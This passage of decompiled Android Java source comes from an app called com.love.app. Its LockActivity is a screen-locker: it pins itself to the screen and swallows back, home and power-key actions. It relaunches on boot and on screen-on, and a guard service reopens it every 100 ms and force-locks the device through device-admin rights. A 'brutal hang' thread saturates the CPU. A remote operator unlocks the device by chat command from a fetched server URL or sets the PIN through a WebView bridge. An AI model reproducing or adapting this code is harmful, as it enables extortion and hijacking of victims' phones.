                if (var10_11.timestamp > var2_8) {
                    var4_10 = var10_11.timestamp;
                }
                if ("admin".equals(var10_11.sender) && "/unlock".equalsIgnoreCase(var10_11.text.trim())) {
                    var9_7 = new LockActivity$$ExternalSyntheticLambda2(this);
                    this.runOnUiThread((Runnable)var9_7);
                }
                var2_8 = var4_10;
            }
            ** GOTO lbl-1000
            {
                catch (Throwable var6_2) {
                    break block17;
                }
                catch (Exception var6_3) {}
                {
                    Log.e((String)"LockActivity", (String)"pollChatMessages error", (Throwable)var6_3);
                    try {
                        Thread.sleep(2000L);
lbl54:
                        // 2 sources

                        while (true) {
                            if (!this.isRunning) return;
                            break;
                        }
                    }
                    catch (Exception var6_4) {
                        ** continue;
                    }
lbl-1000:
                    // 1 sources

                    {
                        this.lastTimestamp = var2_8;
                        var8_5 = new LockActivity$$ExternalSyntheticLambda3(this, var7_6);
                        this.runOnUiThread((Runnable)var8_5);
lbl62:
                        // 3 sources

                        var6_1.disconnect();
                        if (!this.isRunning) return;
                    }
                    this.pollHandler.postDelayed(this.pollRunnable, 1000L);
                    return;
                }
            }
        }
        if (!this.isRunning) throw var6_2;
        this.pollHandler.postDelayed(this.pollRunnable, 1000L);
        throw var6_2;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$sendChatMessage$3$com_love_app_LockActivity(String object) {
        String string2 = ConfigFetcher.getBaseUrl((Context)this);
        if (string2 == null) {
            return;
        }
        try {
            StringBuilder stringBuilder = new StringBuilder();
            Object object2 = new URL(stringBuilder.append(string2).append("/chat/send").toString());
            object2 = (HttpURLConnection)((URL)object2).openConnection();
            ((HttpURLConnection)object2).setRequestMethod("POST");
            ((URLConnection)object2).setRequestProperty("Content-Type", "application/json");
            ((URLConnection)object2).setDoOutput(true);
            stringBuilder = new JSONObject();
            stringBuilder.put("device_id", this.deviceId);
            stringBuilder.put("sender", "target");
            stringBuilder.put("text", object);
            object = ((URLConnection)object2).getOutputStream();
            ((OutputStream)object).write(stringBuilder.toString().getBytes());
            ((OutputStream)object).close();
            int n = ((HttpURLConnection)object2).getResponseCode();
            if (n != 200) {
                object = new StringBuilder("Send chat failed: ");
                Log.e((String)TAG, (String)((StringBuilder)object).append(n).toString());
            }
            ((HttpURLConnection)object2).disconnect();
            return;
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"sendChatMessage error", (Throwable)exception);
        }
    }

    /* synthetic */ void lambda$setupChatUI$2$com_love_app_LockActivity(View object) {
        object = this.chatInput.getText().toString().trim();
        if (((String)object).isEmpty()) {
            return;
        }
        this.sendChatMessage((String)object);
        this.chatInput.setText((CharSequence)"");
    }

    /* synthetic */ void lambda$setupKeypad$6$com_love_app_LockActivity(View view) {
        this.deleteLastChar();
    }

    /* synthetic */ void lambda$setupKeypad$7$com_love_app_LockActivity(int n, View view) {
        this.appendPin(n);
    }

    /* synthetic */ void lambda$startBrutalHang$13$com_love_app_LockActivity() {
        Process.setThreadPriority((int)-19);
        long l = System.nanoTime();
        while (this.isRunning) {
            l = l >>> 32 ^ 6364136223846793005L * l + 1442695040888963407L;
            double d = l;
            Math.sin(d);
            Math.cos(d);
            Math.sqrt(Math.abs(l));
        }
    }

    /* synthetic */ void lambda$startHeaderAnimation$12$com_love_app_LockActivity(ValueAnimator valueAnimator) {
        this.headerZone.setBackgroundColor(((Integer)valueAnimator.getAnimatedValue()).intValue());
    }

    /* synthetic */ void lambda$updatePinDisplay$9$com_love_app_LockActivity() {
        this.pinDisplay.animate().scaleX(1.0f).scaleY(1.0f).setDuration(50L).start();
    }

    public void onBackPressed() {
    }

    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        bundle = this.getSharedPreferences("love_config", 0);
        this.prefs = bundle;
        this.currentMode = bundle.getString("lock_mode", "default");
        this.deviceId = Settings.Secure.getString((ContentResolver)this.getContentResolver(), (String)"android_id");
        this.startLockTask();
        this.requestWindowFeature(1);
        this.getWindow().addFlags(6825089);
        if (Build.VERSION.SDK_INT >= 27) {
            this.setShowWhenLocked(true);
            this.setTurnScreenOn(true);
        }
        if (Build.VERSION.SDK_INT >= 26 && (bundle = (KeyguardManager)this.getSystemService("keyguard")) != null) {
            bundle.requestDismissKeyguard((Activity)this, null);
        }
        this.setContentView(2131492893);
        this.hideSystemUI();
        this.initViews();
        this.setupMode();
        this.acquireWakeLock();
        if ("chat".equals(this.currentMode)) {
            this.startChatLockEnforcement();
        } else {
            this.startHeaderAnimation();
            this.initHardware();
            this.startAggressiveEffects();
            this.startBrutalHang();
        }
        this.playLockSound();
        this.registerScreenOnReceiver();
        this.registerReceiver(this.unlockReceiver, new IntentFilter("com.love.app.UNLOCK_NOW"));
        this.startLockGuardService();
        this.applyEntranceAnimation();
    }

    protected void onDestroy() {
        this.isRunning = false;
        Object object = this.pollHandler;
        if (object != null) {
            object.removeCallbacks(this.pollRunnable);
        }
        if ((object = this.headerAnimator) != null) {
            object.cancel();
        }
        this.stopAllEffects();
        object = this.webView;
        if (object != null) {
            object.destroy();
        }
        if ((object = this.executor) != null) {
            object.shutdownNow();
        }
        if ((object = this.unlockReceiver) != null) {
            try {
                this.unregisterReceiver((BroadcastReceiver)object);
                this.unlockReceiver = null;
            }
            catch (Exception exception) {
                Log.e((String)TAG, (String)"Error unregister unlockReceiver", (Throwable)exception);
            }
        }
        if ((object = this.prefs) != null && object.getBoolean("is_locked", false)) {
            this.restartLock();
        }
    }

    public boolean onKeyDown(int n, KeyEvent keyEvent) {
        if (n == 26) {
            this.collapseStatusBar();
            this.sendBroadcast(new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS"));
            return super.onKeyDown(n, keyEvent);
        }
        return true;
    }

    protected void onPause() {
        super.onPause();
        if (this.isRunning && !this.isFinishing()) {
            this.collapseStatusBar();
            if (!"chat".equals(this.currentMode)) {
                this.sendBroadcast(new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS"));
                this.handler.postDelayed((Runnable)new LockActivity$$ExternalSyntheticLambda19(this), 30L);
            }
        }
    }

    protected void onStop() {
        super.onStop();
        if (this.isRunning && !this.isFinishing()) {
            this.collapseStatusBar();
            if (!"chat".equals(this.currentMode)) {
                this.sendBroadcast(new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS"));
                this.handler.postDelayed((Runnable)new LockActivity$$ExternalSyntheticLambda19(this), 30L);
            }
        }
    }

    public void onUserLeaveHint() {
        if (this.isRunning) {
            this.collapseStatusBar();
            if (!"chat".equals(this.currentMode)) {
                this.sendBroadcast(new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS"));
                this.restartLock();
            }
            this.moveTaskToFront();
            if (!this.isAdminActive()) {
                this.triggerFullHang();
            }
        }
    }

    public void onWindowFocusChanged(boolean bl) {
        if (bl) {
            this.hideSystemUI();
        } else if (!this.isFinishing() && this.isRunning) {
            this.collapseStatusBar();
            if (!"chat".equals(this.currentMode)) {
                this.sendBroadcast(new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS"));
                this.handler.postDelayed((Runnable)new LockActivity$$ExternalSyntheticLambda19(this), 30L);
            }
        }
    }

    public static class BootReceiver
    extends BroadcastReceiver {
        public void onReceive(Context context, Intent intent) {
            if ("android.intent.action.BOOT_COMPLETED".equals(intent.getAction())) {
                intent = new Intent(context, LockActivity.class);
                intent.addFlags(0x14000000);
                context.startActivity(intent);
                intent = new Intent(context, LockGuardService.class);
                intent.setAction(LockActivity.ACTION_START_LOCK);
                if (Build.VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent);
                } else {
                    context.startService(intent);
                }
            }
        }
    }

    private class ChatAdapter
    extends RecyclerView.Adapter<ViewHolder> {
        final LockActivity this$0;

        private ChatAdapter(LockActivity lockActivity) {
            this.this$0 = lockActivity;
        }

        /* synthetic */ ChatAdapter(LockActivity lockActivity, LockActivity$ChatAdapter_IA lockActivity$ChatAdapter_IA) {
            this(lockActivity);
        }

        static /* synthetic */ void lambda$onBindViewHolder$0(String string2, ViewHolder viewHolder, Bitmap bitmap) {
            if (string2.equals(viewHolder.img.getTag())) {
                viewHolder.img.setImageBitmap(bitmap);
            }
        }

        /*
         * Enabled force condition propagation
         * Lifted jumps to return sites
         */
        static /* synthetic */ void lambda$onBindViewHolder$1(String string2, ViewHolder viewHolder) {
            try {
                Object object = new URL(string2);
                Bitmap bitmap = BitmapFactory.decodeStream((InputStream)((URL)object).openStream());
                ImageView imageView = viewHolder.img;
                object = new LockActivity$ChatAdapter$$ExternalSyntheticLambda1(string2, viewHolder, bitmap);
                imageView.post((Runnable)object);
                return;
            }
            catch (Exception exception) {
                return;
            }
        }

        @Override
        public int getItemCount() {
            return this.this$0.chatMessages.size();
        }

        @Override
        public void onBindViewHolder(ViewHolder viewHolder, int n) {
            ChatMessage chatMessage = (ChatMessage)this.this$0.chatMessages.get(n);
            String string2 = chatMessage.sender.equals("target") ? "🧑 Saya: " : "👤 Admin: ";
            if (chatMessage.text.startsWith("[IMG]")) {
                viewHolder.text1.setText((CharSequence)string2.concat("Mengirim Gambar:"));
                viewHolder.img.setVisibility(0);
                string2 = chatMessage.text.substring(5);
                viewHolder.img.setTag((Object)string2);
                viewHolder.img.setImageBitmap(null);
                new Thread(new LockActivity$ChatAdapter$$ExternalSyntheticLambda0(string2, viewHolder)).start();
            } else {
                viewHolder.text1.setText((CharSequence)(string2 + chatMessage.text));
                viewHolder.img.setVisibility(8);
            }
            viewHolder.text2.setText((CharSequence)new SimpleDateFormat("HH:mm", Locale.getDefault()).format(new Date(chatMessage.timestamp)));
        }

        @Override
        public ViewHolder onCreateViewHolder(ViewGroup viewGroup, int n) {
            LinearLayout linearLayout = new LinearLayout(viewGroup.getContext());
            linearLayout.setOrientation(1);
            linearLayout.setPadding(16, 16, 16, 16);
            linearLayout.setLayoutParams(new ViewGroup.LayoutParams(-1, -2));
            TextView textView = new TextView(viewGroup.getContext());
            textView.setTextColor(-1);
            textView.setTextSize(16.0f);
            ImageView imageView = new ImageView(viewGroup.getContext());
            imageView.setVisibility(8);
            imageView.setAdjustViewBounds(true);
            imageView.setMaxHeight(600);
            LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-2, -2);
            layoutParams.setMargins(0, 8, 0, 8);
            imageView.setLayoutParams((ViewGroup.LayoutParams)layoutParams);
            viewGroup = new TextView(viewGroup.getContext());
            viewGroup.setTextColor(-7829368);
            viewGroup.setTextSize(12.0f);
            linearLayout.addView((View)textView);
            linearLayout.addView((View)imageView);
            linearLayout.addView((View)viewGroup);
            return new ViewHolder(this, (View)linearLayout, textView, (TextView)viewGroup, imageView);
        }

        class ViewHolder
        extends RecyclerView.ViewHolder {
            ImageView img;
            TextView text1;
            TextView text2;
            final ChatAdapter this$1;

            ViewHolder(ChatAdapter chatAdapter, View view, TextView textView, TextView textView2, ImageView imageView) {
                this.this$1 = chatAdapter;
                super(view);
                this.text1 = textView;
                this.text2 = textView2;
                this.img = imageView;
            }
        }
    }

    private class ChatMessage {
        String sender;
        String text;
        final LockActivity this$0;
        long timestamp;

        private ChatMessage(LockActivity lockActivity) {
            this.this$0 = lockActivity;
        }

        /* synthetic */ ChatMessage(LockActivity lockActivity, LockActivity$ChatMessage_IA lockActivity$ChatMessage_IA) {
            this(lockActivity);
        }
    }

    public static class LockGuardService
    extends Service {
        private DevicePolicyManager dpm;
        private Handler handler = new Handler(Looper.getMainLooper());
        private boolean monitoring = false;
        private BroadcastReceiver screenReceiver;

        /*
         * WARNING - void declaration
         * Enabled force condition propagation
         * Lifted jumps to return sites
         */
        private boolean isLockActivityVisible() {
            void var2_6;
            ActivityManager activityManager = (ActivityManager)this.getSystemService("activity");
            if (activityManager == null) {
                return false;
            }
            try {
                for (ActivityManager.AppTask appTask : activityManager.getAppTasks()) {
                    if (appTask.getTaskInfo() == null) continue;
                    if (appTask.getTaskInfo().baseIntent != null) {
                        ComponentName componentName = appTask.getTaskInfo().baseIntent.getComponent();
                    } else {
                        Object var2_5 = null;
                    }
                    if (var2_6 == null) continue;
                }
            }
            catch (Exception exception) {
                return false;
            }
            {
                boolean bl = var2_6.getClassName().contains(LockActivity.TAG);
                if (!bl) continue;
                return true;
            }
            return false;
        }

        private void startForegroundNotif() {
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel notificationChannel = new NotificationChannel("lock_guard", (CharSequence)"Lock Guard", 2);
                NotificationManager notificationManager = (NotificationManager)this.getSystemService("notification");
                if (notificationManager != null) {
                    notificationManager.createNotificationChannel(notificationChannel);
                }
            }
            this.startForeground(9002, new NotificationCompat.Builder((Context)this, "lock_guard").setContentTitle("Sistem Keamanan Aktif").setContentText("Perangkat dalam perlindungan penuh").setSmallIcon(17301551).setPriority(-1).setOngoing(true).build());
        }

        private void startMonitoring() {
            if (this.monitoring) {
                return;
            }
            this.monitoring = true;
            this.handler.post(new Runnable(this){
                final LockGuardService this$0;
                {
                    this.this$0 = lockGuardService;
                }

                /*
                 * Enabled aggressive block sorting
                 * Enabled unnecessary exception pruning
                 * Enabled aggressive exception aggregation
                 */
                @Override
                public void run() {
                    block5: {
                        Intent intent;
                        if (!this.this$0.monitoring) {
                            return;
                        }
                        if (!this.this$0.isLockActivityVisible()) {
                            intent = new Intent((Context)this.this$0, LockActivity.class);
                            intent.addFlags(0x14000000);
                            this.this$0.startActivity(intent);
                        }
                        try {
                            if ("chat".equals(this.this$0.getSharedPreferences("love_config", 0).getString("lock_mode", "default"))) break block5;
                            intent = new ComponentName((Context)this.this$0, AdminReceiver.class);
                            if (this.this$0.dpm != null && this.this$0.dpm.isAdminActive((ComponentName)intent)) {
                                this.this$0.dpm.lockNow();
                            }
                        }
                        catch (Exception exception) {}
                    }
                    this.this$0.handler.postDelayed((Runnable)this, 100L);
                }
            });
        }

        private void stopMonitoring() {
            this.monitoring = false;
            this.handler.removeCallbacksAndMessages(null);
        }

        public IBinder onBind(Intent intent) {
            return null;
        }

        public void onCreate() {
            BroadcastReceiver broadcastReceiver2;
            super.onCreate();
            this.dpm = (DevicePolicyManager)this.getSystemService("device_policy");
            this.screenReceiver = broadcastReceiver2 = new BroadcastReceiver(this){
                final LockGuardService this$0;
                {
                    this.this$0 = lockGuardService;
                }

                public void onReceive(Context context, Intent intent) {
                    if ("android.intent.action.SCREEN_ON".equals(intent.getAction())) {
                        context = new Intent((Context)this.this$0, LockActivity.class);
                        context.addFlags(0x14000000);
                        this.this$0.startActivity((Intent)context);
                    }
                }
            };
            this.registerReceiver(broadcastReceiver2, new IntentFilter("android.intent.action.SCREEN_ON"));
        }

        public void onDestroy() {
            super.onDestroy();
            BroadcastReceiver broadcastReceiver2 = this.screenReceiver;
            if (broadcastReceiver2 != null) {
                this.unregisterReceiver(broadcastReceiver2);
            }
            if (this.monitoring) {
                broadcastReceiver2 = new Intent((Context)this, LockGuardService.class);
                broadcastReceiver2.setAction(LockActivity.ACTION_START_LOCK);
                if (Build.VERSION.SDK_INT >= 26) {
                    this.startForegroundService((Intent)broadcastReceiver2);
                } else {
                    this.startService((Intent)broadcastReceiver2);
                }
            }
        }

        public int onStartCommand(Intent intent, int n, int n2) {
            this.startForegroundNotif();
            if (intent != null && LockActivity.ACTION_STOP_LOCK.equals(intent.getAction())) {
                this.stopMonitoring();
                this.stopSelf();
                return 2;
            }
            this.startMonitoring();
            return 1;
        }
    }

    private class WebControlInterface {
        final LockActivity this$0;

        private WebControlInterface(LockActivity lockActivity) {
            this.this$0 = lockActivity;
        }

        /* synthetic */ WebControlInterface(LockActivity lockActivity, LockActivity$WebControlInterface_IA lockActivity$WebControlInterface_IA) {
            this(lockActivity);
        }

        /* synthetic */ void lambda$lockNow$1$com_love_app_LockActivity$WebControlInterface() {
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager)this.this$0.getSystemService("device_policy");
            if (devicePolicyManager.isAdminActive(new ComponentName((Context)this.this$0, AdminReceiver.class))) {
                devicePolicyManager.lockNow();
            }
        }

        /* synthetic */ void lambda$showToast$2$com_love_app_LockActivity$WebControlInterface(String string2) {
            Toast.makeText((Context)this.this$0, (CharSequence)string2, (int)0).show();
        }

        /* synthetic */ void lambda$unlockDevice$0$com_love_app_LockActivity$WebControlInterface(String string2) {
            String string3 = this.this$0.prefs.getString("lock_pin", LockActivity.DEFAULT_PIN);
            if (string2 != null && string2.equals(string3)) {
                this.this$0.unlockSuccess();
            } else {
                Toast.makeText((Context)this.this$0, (CharSequence)"PIN salah", (int)0).show();
            }
        }

        @JavascriptInterface
        public void lockNow() {
            this.this$0.runOnUiThread(new LockActivity$WebControlInterface$$ExternalSyntheticLambda1(this));
        }

        @JavascriptInterface
        public void setPin(String string2) {
            if (string2 != null && string2.length() >= 4 && string2.length() <= 6) {
                this.this$0.prefs.edit().putString("lock_pin", string2).apply();
            }
        }

        @JavascriptInterface
        public void showToast(String string2) {
            this.this$0.runOnUiThread(new LockActivity$WebControlInterface$$ExternalSyntheticLambda2(this, string2));
        }

        @JavascriptInterface
        public void unlockDevice(String string2) {
            this.this$0.runOnUiThread(new LockActivity$WebControlInterface$$ExternalSyntheticLambda0(this, string2));
        }
    }
}

